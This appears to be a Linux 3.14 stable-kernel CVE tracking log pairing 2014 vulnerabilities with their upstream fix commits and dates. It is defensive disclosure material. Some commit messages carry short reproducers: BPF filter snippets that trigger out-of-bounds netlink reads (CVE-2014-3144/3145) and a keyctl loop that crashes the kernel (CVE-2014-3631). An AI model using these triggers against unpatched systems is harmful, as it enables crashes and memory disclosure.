Break Commit: 4738c1db1593687713869fa69e733eebc7b0d6d8
Break Tag: 2.6
Linus Fix Date: 2014-04-13
Linus Commit: 05ab8f2647e4221cbdb3856dd7d32bd5407316b3
Linus Tag: 3.15
Stable Date: 2014-05-31
Stable Commit: 72beb5639e05f940135ed00bc2fa0200d62074a6
Stable Tag: 3.14.5

CVE-2014-3144:
CVE-2014-3145:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.5.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 05ab8f2647e4221cbdb3856dd7d32bd5407316b3
Author: Mathias Krause <minipli@googlemail.com>
Date:   Sun Apr 13 18:23:33 2014 +0200

    filter: prevent nla extensions to peek beyond the end of the message
    
    The BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check
    for a minimal message length before testing the supplied offset to be
    within the bounds of the message. This allows the subtraction of the nla
    header to underflow and therefore -- as the data type is unsigned --
    allowing far to big offset and length values for the search of the
    netlink attribute.
    
    The remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is
    also wrong. It has the minuend and subtrahend mixed up, therefore
    calculates a huge length value, allowing to overrun the end of the
    message while looking for the netlink attribute.
    
    The following three BPF snippets will trigger the bugs when attached to
    a UNIX datagram socket and parsing a message with length 1, 2 or 3.
    
     ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--
     | ld	#0x87654321
     | ldx	#42
     | ld	#nla
     | ret	a
     `---
    
     ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--
     | ld	#0x87654321
     | ldx	#42
     | ld	#nlan
     | ret	a
     `---
    
     ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--
     | ; (needs a fake netlink header at offset 0)
     | ld	#0
     | ldx	#42
     | ld	#nlan
     | ret	a
     `---
    
    Fix the first issue by ensuring the message length fulfills the minimal
    size constrains of a nla header. Fix the second bug by getting the math
    for the remainder calculation right.
    
    Fixes: 4738c1db15 ("[SKFILTER]: Add SKF_ADF_NLATTR instruction")
    Fixes: d214c7537b ("filter: add SKF_AD_NLATTR_NEST to look for nested..")
    Cc: Patrick McHardy <kaber@trash.net>
    Cc: Pablo Neira Ayuso <pablo@netfilter.org>
    Signed-off-by: Mathias Krause <minipli@googlemail.com>
    Acked-by: Daniel Borkmann <dborkman@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/core/filter.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-05-11
CVE: CVE-2014-3144
Break Date: 2008-04-10
Break Commit: 4738c1db1593687713869fa69e733eebc7b0d6d8
Break Tag: 2.6
Linus Fix Date: 2014-04-13
Linus Commit: 05ab8f2647e4221cbdb3856dd7d32bd5407316b3
Linus Tag: 3.15
Stable Date: 2014-05-31
Stable Commit: 72beb5639e05f940135ed00bc2fa0200d62074a6
Stable Tag: 3.14.5

CVE-2014-3153:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.6.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 13fbca4c6ecd96ec1a1cfa2e4f2ce191fe928a5e
Author: Thomas Gleixner <tglx@linutronix.de>
Date:   Tue Jun 3 12:27:07 2014 +0000

    futex: Always cleanup owner tid in unlock_pi
    
    If the owner died bit is set at futex_unlock_pi, we currently do not
    cleanup the user space futex.  So the owner TID of the current owner
    (the unlocker) persists.  That's observable inconsistant state,
    especially when the ownership of the pi state got transferred.
    
    Clean it up unconditionally.
    
    Signed-off-by: Thomas Gleixner <tglx@linutronix.de>
    Cc: Kees Cook <keescook@chromium.org>
    Cc: Will Drewry <wad@chromium.org>
    Cc: Darren Hart <dvhart@linux.intel.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 kernel/futex.c |   40 ++++++++++++++++++----------------------
 1 file changed, 18 insertions(+), 22 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-07
CVE: CVE-2014-3153
Break Date: 2009-04-06
Break Commit: 52400ba946759af28442dee6265c5c0180ac7122
Break Tag: 2.6
Linus Fix Date: 2014-06-05
Linus Commit: 13fbca4c6ecd96ec1a1cfa2e4f2ce191fe928a5e
Linus Tag: 3.15
Stable Date: 2014-06-07
Stable Commit: 19040c57ac6f39a6940c7c266bb80cee113d3a18
Stable Tag: 3.14.6

CVE-2014-3153:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.6.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 54a217887a7b658e2650c3feff22756ab80c7339
Author: Thomas Gleixner <tglx@linutronix.de>
Date:   Tue Jun 3 12:27:08 2014 +0000

    futex: Make lookup_pi_state more robust
    
    The current implementation of lookup_pi_state has ambigous handling of
    the TID value 0 in the user space futex.  We can get into the kernel
    even if the TID value is 0, because either there is a stale waiters bit
    or the owner died bit is set or we are called from the requeue_pi path
    or from user space just for fun.
    
    The current code avoids an explicit sanity check for pid = 0 in case
    that kernel internal state (waiters) are found for the user space
    address.  This can lead to state leakage and worse under some
    circumstances.
    
    Handle the cases explicit:
    
           Waiter | pi_state | pi->owner | uTID      | uODIED | ?
    
      [1]  NULL   | ---      | ---       | 0         | 0/1    | Valid
      [2]  NULL   | ---      | ---       | >0        | 0/1    | Valid
    
      [3]  Found  | NULL     | --        | Any       | 0/1    | Invalid
    
      [4]  Found  | Found    | NULL      | 0         | 1      | Valid
      [5]  Found  | Found    | NULL      | >0        | 1      | Invalid
    
      [6]  Found  | Found    | task      | 0         | 1      | Valid
    
      [7]  Found  | Found    | NULL      | Any       | 0      | Invalid
    
      [8]  Found  | Found    | task      | ==taskTID | 0/1    | Valid
      [9]  Found  | Found    | task      | 0         | 0      | Invalid
      [10] Found  | Found    | task      | !=taskTID | 0/1    | Invalid
    
     [1] Indicates that the kernel can acquire the futex atomically. We
         came came here due to a stale FUTEX_WAITERS/FUTEX_OWNER_DIED bit.
    
     [2] Valid, if TID does not belong to a kernel thread. If no matching
         thread is found then it indicates that the owner TID has died.
    
     [3] Invalid. The waiter is queued on a non PI futex
    
     [4] Valid state after exit_robust_list(), which sets the user space
         value to FUTEX_WAITERS | FUTEX_OWNER_DIED.
    
     [5] The user space value got manipulated between exit_robust_list()
         and exit_pi_state_list()
    
     [6] Valid state after exit_pi_state_list() which sets the new owner in
         the pi_state but cannot access the user space value.
    
     [7] pi_state->owner can only be NULL when the OWNER_DIED bit is set.
    
     [8] Owner and user space value match
    
     [9] There is no transient state which sets the user space TID to 0
         except exit_robust_list(), but this is indicated by the
         FUTEX_OWNER_DIED bit. See [4]
    
    [10] There is no transient state which leaves owner and user space
         TID out of sync.
    
    Signed-off-by: Thomas Gleixner <tglx@linutronix.de>
    Cc: Kees Cook <keescook@chromium.org>
    Cc: Will Drewry <wad@chromium.org>
    Cc: Darren Hart <dvhart@linux.intel.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 kernel/futex.c |  134 ++++++++++++++++++++++++++++++++++++++++++++------------
 1 file changed, 106 insertions(+), 28 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-07
CVE: CVE-2014-3153
Break Date: 2009-04-06
Break Commit: 52400ba946759af28442dee6265c5c0180ac7122
Break Tag: 2.6
Linus Fix Date: 2014-06-05
Linus Commit: 54a217887a7b658e2650c3feff22756ab80c7339
Linus Tag: 3.15
Stable Date: 2014-06-07
Stable Commit: b1f9d594668d008cacd5679cfde675dcdb9f5f8f
Stable Tag: 3.14.6

CVE-2014-3153:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.6.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b3eaa9fc5cd0a4d74b18f6b8dc617aeaf1873270
Author: Thomas Gleixner <tglx@linutronix.de>
Date:   Tue Jun 3 12:27:06 2014 +0000

    futex: Validate atomic acquisition in futex_lock_pi_atomic()
    
    We need to protect the atomic acquisition in the kernel against rogue
    user space which sets the user space futex to 0, so the kernel side
    acquisition succeeds while there is existing state in the kernel
    associated to the real owner.
    
    Verify whether the futex has waiters associated with kernel state.  If
    it has, return -EINVAL.  The state is corrupted already, so no point in
    cleaning it up.  Subsequent calls will fail as well.  Not our problem.
    
    [ tglx: Use futex_top_waiter() and explain why we do not need to try
      	restoring the already corrupted user space state. ]
    
    Signed-off-by: Darren Hart <dvhart@linux.intel.com>
    Cc: Kees Cook <keescook@chromium.org>
    Cc: Will Drewry <wad@chromium.org>
    Cc: stable@vger.kernel.org
    Signed-off-by: Thomas Gleixner <tglx@linutronix.de>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 kernel/futex.c |   14 +++++++++++---
 1 file changed, 11 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-07
CVE: CVE-2014-3153
Break Date: 2009-04-06
Break Commit: 52400ba946759af28442dee6265c5c0180ac7122
Break Tag: 2.6
Linus Fix Date: 2014-06-05
Linus Commit: b3eaa9fc5cd0a4d74b18f6b8dc617aeaf1873270
Linus Tag: 3.15
Stable Date: 2014-06-07
Stable Commit: cae300d1bd7c591602725520aec185cc81d49547
Stable Tag: 3.14.6

CVE-2014-3153:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.6.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit e9c243a5a6de0be8e584c604d353412584b592f8
Author: Thomas Gleixner <tglx@linutronix.de>
Date:   Tue Jun 3 12:27:06 2014 +0000

    futex-prevent-requeue-pi-on-same-futex.patch futex: Forbid uaddr == uaddr2 in futex_requeue(..., requeue_pi=1)
    
    If uaddr == uaddr2, then we have broken the rule of only requeueing from
    a non-pi futex to a pi futex with this call.  If we attempt this, then
    dangling pointers may be left for rt_waiter resulting in an exploitable
    condition.
    
    This change brings futex_requeue() in line with futex_wait_requeue_pi()
    which performs the same check as per commit 6f7b0a2a5c0f ("futex: Forbid
    uaddr == uaddr2 in futex_wait_requeue_pi()")
    
    [ tglx: Compare the resulting keys as well, as uaddrs might be
      	different depending on the mapping ]
    
    Fixes CVE-2014-3153.
    
    Reported-by: Pinkie Pie
    Signed-off-by: Will Drewry <wad@chromium.org>
    Signed-off-by: Kees Cook <keescook@chromium.org>
    Cc: stable@vger.kernel.org
    Signed-off-by: Thomas Gleixner <tglx@linutronix.de>
    Reviewed-by: Darren Hart <dvhart@linux.intel.com>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 kernel/futex.c |   25 +++++++++++++++++++++++++
 1 file changed, 25 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-07
CVE: CVE-2014-3153
Break Date: 2009-04-06
Break Commit: 52400ba946759af28442dee6265c5c0180ac7122
Break Tag: 2.6
Linus Fix Date: 2014-06-05
Linus Commit: e9c243a5a6de0be8e584c604d353412584b592f8
Linus Tag: 3.15
Stable Date: 2014-06-07
Stable Commit: 1ab0607b48fdcbac787b073f845f2ef529d4e936
Stable Tag: 3.14.6

CVE-2014-3181:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.20.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit c54def7bd64d7c0b6993336abcffb8444795bf38
Author: Jiri Kosina <jkosina@suse.cz>
Date:   Wed Aug 27 09:12:24 2014 +0200

    HID: magicmouse: sanity check report size in raw_event() callback
    
    The report passed to us from transport driver could potentially be
    arbitrarily large, therefore we better sanity-check it so that
    magicmouse_emit_touch() gets only valid values of raw_id.
    
    Cc: stable@vger.kernel.org
    Reported-by: Steven Vittitoe <scvitti@google.com>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/hid-magicmouse.c |   10 ++++++++++
 1 file changed, 10 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-3181
Break Date: 2010-09-03
Break Commit: a462230e16acc8664145216da3c928d03556691a
Break Tag: 2.6
Linus Fix Date: 2014-08-27
Linus Commit: c54def7bd64d7c0b6993336abcffb8444795bf38
Linus Tag: 3.17
Stable Date: 2014-10-05
Stable Commit: 6e4106ec619b16593d66ad6384f6f983d423ee0b
Stable Tag: 3.14.20

CVE-2014-3182:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.18.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ad3e14d7c5268c2e24477c6ef54bbdf88add5d36
Author: Jiri Kosina <jkosina@suse.cz>
Date:   Thu Aug 21 09:57:17 2014 -0500

    HID: logitech: perform bounds checking on device_id early enough
    
    device_index is a char type and the size of paired_dj_deivces is 7
    elements, therefore proper bounds checking has to be applied to
    device_index before it is used.
    
    We are currently performing the bounds checking in
    logi_dj_recv_add_djhid_device(), which is too late, as malicious device
    could send REPORT_TYPE_NOTIF_DEVICE_UNPAIRED early enough and trigger the
    problem in one of the report forwarding functions called from
    logi_dj_raw_event().
    
    Fix this by performing the check at the earliest possible ocasion in
    logi_dj_raw_event().
    
    Cc: stable@vger.kernel.org
    Reported-by: Ben Hawkes <hawkes@google.com>
    Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/hid-logitech-dj.c |   13 ++++++-------
 1 file changed, 6 insertions(+), 7 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-3182
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-08-21
Linus Commit: ad3e14d7c5268c2e24477c6ef54bbdf88add5d36
Linus Tag: 3.17
Stable Date: 2014-09-05
Stable Commit: b165b85cb5359d7d223b6d4fa645302891c44013
Stable Tag: 3.14.18

CVE-2014-3183:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51217e69697fba92a06e07e16f55c9a52d8e8945
Author: Jiri Kosina <jkosina@suse.cz>
Date:   Thu Aug 21 09:56:47 2014 -0500

    HID: logitech: fix bounds checking on LED report size
    
    The check on report size for REPORT_TYPE_LEDS in logi_dj_ll_raw_request()
    is wrong; the current check doesn't make any sense -- the report allocated
    by HID core in hid_hw_raw_request() can be much larger than
    DJREPORT_SHORT_LENGTH, and currently logi_dj_ll_raw_request() doesn't
    handle this properly at all.
    
    Fix the check by actually trimming down the report size properly if it is
    too large.
    
    Cc: stable@vger.kernel.org
    Reported-by: Ben Hawkes <hawkes@google.com>
    Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/hid-logitech-dj.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-3183
Break Date: 2014-02-17
Break Commit: 0e40d35637d68f654b66f4562c9a914be7d06bd1
Break Tag: 3.15
Linus Fix Date: 2014-08-21
Linus Commit: 51217e69697fba92a06e07e16f55c9a52d8e8945
Linus Tag: 3.17
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-3184:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.18.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4ab25786c87eb20857bbb715c3ae34ec8fd6a214
Author: Jiri Kosina <jkosina@suse.cz>
Date:   Thu Aug 21 09:57:48 2014 -0500

    HID: fix a couple of off-by-ones
    
    There are a few very theoretical off-by-one bugs in report descriptor size
    checking when performing a pre-parsing fixup. Fix those.
    
    Cc: stable@vger.kernel.org
    Reported-by: Ben Hawkes <hawkes@google.com>
    Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/hid-cherry.c   |    2 +-
 drivers/hid/hid-kye.c      |    2 +-
 drivers/hid/hid-lg.c       |    4 ++--
 drivers/hid/hid-monterey.c |    2 +-
 drivers/hid/hid-petalynx.c |    2 +-
 drivers/hid/hid-sunplus.c  |    2 +-
 6 files changed, 7 insertions(+), 7 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-3184
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-08-21
Linus Commit: 4ab25786c87eb20857bbb715c3ae34ec8fd6a214
Linus Tag: 3.17
Stable Date: 2014-09-05
Stable Commit: 1de1376b8e805c553d28354c9ae5d5fddb8bbff8
Stable Tag: 3.14.18

CVE-2014-3185:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.18.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6817ae225cd650fb1c3295d769298c38b1eba818
Author: James Forshaw <forshaw@google.com>
Date:   Sat Aug 23 14:39:48 2014 -0700

    USB: whiteheat: Added bounds checking for bulk command response
    
    This patch fixes a potential security issue in the whiteheat USB driver
    which might allow a local attacker to cause kernel memory corrpution. This
    is due to an unchecked memcpy into a fixed size buffer (of 64 bytes). On
    EHCI and XHCI busses it's possible to craft responses greater than 64
    bytes leading a buffer overflow.
    
    Signed-off-by: James Forshaw <forshaw@google.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/serial/whiteheat.c |    7 ++++++-
 1 file changed, 6 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-3185
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-08-24
Linus Commit: 6817ae225cd650fb1c3295d769298c38b1eba818
Linus Tag: 3.17
Stable Date: 2014-09-05
Stable Commit: ebc8083c7fe92a2a4ab8eed0572882c3dfd3746a
Stable Tag: 3.14.18

CVE-2014-3186:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.20.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 844817e47eef14141cf59b8d5ac08dd11c0a9189
Author: Jiri Kosina <jkosina@suse.cz>
Date:   Wed Aug 27 09:13:15 2014 +0200

    HID: picolcd: sanity check report size in raw_event() callback
    
    The report passed to us from transport driver could potentially be
    arbitrarily large, therefore we better sanity-check it so that raw_data
    that we hold in picolcd_pending structure are always kept within proper
    bounds.
    
    Cc: stable@vger.kernel.org
    Reported-by: Steven Vittitoe <scvitti@google.com>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/hid-picolcd_core.c |    6 ++++++
 1 file changed, 6 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-3186
Break Date: 2010-03-31
Break Commit: 236db47c2b3b69464d50c695ab2ddd516cf64520
Break Tag: 2.6
Linus Fix Date: 2014-08-27
Linus Commit: 844817e47eef14141cf59b8d5ac08dd11c0a9189
Linus Tag: 3.17
Stable Date: 2014-10-05
Stable Commit: 2c40d59997ed0b885ac31862e21cb5b84a3e7dca
Stable Tag: 3.14.20

CVE-2014-3534:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.15.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit dab6cf55f81a6e16b8147aed9a843e1691dcd318
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Jun 23 15:29:40 2014 +0200

    s390/ptrace: fix PSW mask check
    
    The PSW mask check of the PTRACE_POKEUSR_AREA command is incorrect.
    The PSW_MASK_USER define contains the PSW_MASK_ASC bits, the ptrace
    interface accepts all combinations for the address-space-control
    bits. To protect the kernel space the PSW mask check in ptrace needs
    to reject the address-space-control bit combination for home space.
    
    Fixes CVE-2014-3534
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 arch/s390/kernel/ptrace.c |   12 ++++++++++--
 1 file changed, 10 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-01
CVE: CVE-2014-3534
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-07-16
Linus Commit: dab6cf55f81a6e16b8147aed9a843e1691dcd318
Linus Tag: 3.16
Stable Date: 2014-07-31
Stable Commit: 1967b156fd85702f52c5cffaaf7f8f03332ef49e
Stable Tag: 3.14.15

CVE-2014-3601:
CVE-2014-8369:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.18.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7
Author: Michael S. Tsirkin <mst@redhat.com>
Date:   Tue Aug 19 19:14:50 2014 +0800

    kvm: iommu: fix the third parameter of kvm_iommu_put_pages (CVE-2014-3601)
    
    The third parameter of kvm_iommu_put_pages is wrong,
    It should be 'gfn - slot->base_gfn'.
    
    By making gfn very large, malicious guest or userspace can cause kvm to
    go to this error path, and subsequently to pass a huge value as size.
    Alternatively if gfn is small, then pages would be pinned but never
    unpinned, causing host memory leak and local DOS.
    
    Passing a reasonable but large value could be the most dangerous case,
    because it would unpin a page that should have stayed pinned, and thus
    allow the device to DMA into arbitrary memory.  However, this cannot
    happen because of the condition that can trigger the error:
    
    - out of memory (where you can't allocate even a single page)
      should not be possible for the attacker to trigger
    
    - when exceeding the iommu's address space, guest pages after gfn
      will also exceed the iommu's address space, and inside
      kvm_iommu_put_pages() the iommu_iova_to_phys() will fail.  The
      page thus would not be unpinned at all.
    
    Reported-by: Jack Morgenstein <jackm@mellanox.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Michael S. Tsirkin <mst@redhat.com>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 virt/kvm/iommu.c |   19 ++++++++++---------
 1 file changed, 10 insertions(+), 9 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-31
CVE: CVE-2014-3601
Break Date: 2010-03-07
Break Commit: fcd95807fb61e67d602610e7ff7129ed769e9fee
Break Tag: 2.6
Linus Fix Date: 2014-08-19
Linus Commit: 350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7
Linus Tag: 3.17
Stable Date: 2014-09-05
Stable Commit: 42a1927a7a1d9e9992a7d1cd43a797e461019e01
Stable Tag: 3.14.18

CVE-2014-3610:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.24.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 854e8bb1aa06c578c2c9145fa6bfe3680ef63b23
Author: Nadav Amit <namit@cs.technion.ac.il>
Date:   Tue Sep 16 03:24:05 2014 +0300

    KVM: x86: Check non-canonical addresses upon WRMSR
    
    Upon WRMSR, the CPU should inject #GP if a non-canonical value (address) is
    written to certain MSRs. The behavior is "almost" identical for AMD and Intel
    (ignoring MSRs that are not implemented in either architecture since they would
    anyhow #GP). However, IA32_SYSENTER_ESP and IA32_SYSENTER_EIP cause #GP if
    non-canonical address is written on Intel but not on AMD (which ignores the top
    32-bits).
    
    Accordingly, this patch injects a #GP on the MSRs which behave identically on
    Intel and AMD.  To eliminate the differences between the architecutres, the
    value which is written to IA32_SYSENTER_ESP and IA32_SYSENTER_EIP is turned to
    canonical value before writing instead of injecting a #GP.
    
    Some references from Intel and AMD manuals:
    
    According to Intel SDM description of WRMSR instruction #GP is expected on
    WRMSR "If the source register contains a non-canonical address and ECX
    specifies one of the following MSRs: IA32_DS_AREA, IA32_FS_BASE, IA32_GS_BASE,
    IA32_KERNEL_GS_BASE, IA32_LSTAR, IA32_SYSENTER_EIP, IA32_SYSENTER_ESP."
    
    According to AMD manual instruction manual:
    LSTAR/CSTAR (SYSCALL): "The WRMSR instruction loads the target RIP into the
    LSTAR and CSTAR registers.  If an RIP written by WRMSR is not in canonical
    form, a general-protection exception (#GP) occurs."
    IA32_GS_BASE and IA32_FS_BASE (WRFSBASE/WRGSBASE): "The address written to the
    base field must be in canonical form or a #GP fault will occur."
    IA32_KERNEL_GS_BASE (SWAPGS): "The address stored in the KernelGSbase MSR must
    be in canonical form."
    
    This patch fixes CVE-2014-3610.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Nadav Amit <namit@cs.technion.ac.il>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/include/asm/kvm_host.h |   14 ++++++++++++++
 arch/x86/kvm/svm.c              |    2 +-
 arch/x86/kvm/vmx.c              |    2 +-
 arch/x86/kvm/x86.c              |   27 ++++++++++++++++++++++++++-
 4 files changed, 42 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-3610
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-24
Linus Commit: 854e8bb1aa06c578c2c9145fa6bfe3680ef63b23
Linus Tag: 3.18
Stable Date: 2014-11-14
Stable Commit: 44d1efb927e6dadb74b6620d1eed232708d75bac
Stable Tag: 3.14.24

CVE-2014-3611:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.24.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 2febc839133280d5a5e8e1179c94ea674489dae2
Author: Andy Honig <ahonig@google.com>
Date:   Wed Aug 27 14:42:54 2014 -0700

    KVM: x86: Improve thread safety in pit
    
    There's a race condition in the PIT emulation code in KVM.  In
    __kvm_migrate_pit_timer the pit_timer object is accessed without
    synchronization.  If the race condition occurs at the wrong time this
    can crash the host kernel.
    
    This fixes CVE-2014-3611.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Andrew Honig <ahonig@google.com>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/i8254.c |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-3611
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-24
Linus Commit: 2febc839133280d5a5e8e1179c94ea674489dae2
Linus Tag: 3.18
Stable Date: 2014-11-14
Stable Commit: 449a72277a5dc2a12cd114af3be81a56ad10cbd1
Stable Tag: 3.14.24

CVE-2014-3631:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.19.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 95389b08d93d5c06ec63ab49bd732b0069b7c35e
Author: David Howells <dhowells@redhat.com>
Date:   Wed Sep 10 22:22:00 2014 +0100

    KEYS: Fix termination condition in assoc array garbage collection
    
    This fixes CVE-2014-3631.
    
    It is possible for an associative array to end up with a shortcut node at the
    root of the tree if there are more than fan-out leaves in the tree, but they
    all crowd into the same slot in the lowest level (ie. they all have the same
    first nibble of their index keys).
    
    When assoc_array_gc() returns back up the tree after scanning some leaves, it
    can fall off of the root and crash because it assumes that the back pointer
    from a shortcut (after label ascend_old_tree) must point to a normal node -
    which isn't true of a shortcut node at the root.
    
    Should we find we're ascending rootwards over a shortcut, we should check to
    see if the backpointer is zero - and if it is, we have completed the scan.
    
    This particular bug cannot occur if the root node is not a shortcut - ie. if
    you have fewer than 17 keys in a keyring or if you have at least two keys that
    sit into separate slots (eg. a keyring and a non keyring).
    
    This can be reproduced by:
    
    	ring=`keyctl newring bar @s`
    	for ((i=1; i<=18; i++)); do last_key=`keyctl newring foo$i $ring`; done
    	keyctl timeout $last_key 2
    
    Doing this:
    
    	echo 3 >/proc/sys/kernel/keys/gc_delay
    
    first will speed things up.
    
    If we do fall off of the top of the tree, we get the following oops:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000018
    IP: [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540
    PGD dae15067 PUD cfc24067 PMD 0
    Oops: 0000 [#1] SMP
